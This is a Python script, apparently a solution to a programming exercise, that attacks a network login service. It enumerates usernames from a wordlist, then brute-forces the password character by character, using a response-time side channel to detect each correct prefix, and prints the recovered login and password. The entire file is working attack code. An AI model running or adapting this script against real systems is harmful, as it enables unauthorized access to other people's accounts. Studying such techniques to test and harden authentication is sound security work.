import socket
import sys
import itertools
from string import ascii_letters, digits
import json
import time


def enumerate_password(famous_password):
    sign_dict = list(ascii_letters + digits)
    enum = itertools.product(sign_dict, repeat=1)
    for var_pass in enum:
        yield famous_password + ''.join(var_pass)


def enumarate_logins(name):
    with open(name, 'r+') as f:
        for login in f:
            yield login.strip()


def send_response_json(client_socket, date):
    send = json.dumps(date)
    client_socket.send(send.encode())
    response = json.loads(client_socket.recv(1024).decode())
    return response['result']


args = sys.argv
address = (args[1], int(args[2]))
famous_password = ''
with socket.socket() as cl_socket:
    cl_socket.connect(address)
    generate_login = enumarate_logins('C:\\Users\\Admin\\Desktop\\logins.txt')

    for login in generate_login:
        response = send_response_json(cl_socket, {'login': login, 'password': ''})
        if response == 'Wrong password!':
            break

    flag = False
    while not flag:
        generate_password = enumerate_password(famous_password)
        for password in generate_password:
            start = time.time()
            response = send_response_json(cl_socket, {'login': login, 'password': password})
            stop = time.time()
            if stop-start >= 0.1:
                famous_password = password
                break
            elif response == 'Connection success!':
                flag = True
                break

    print(json.dumps({'login': login, 'password': password}))
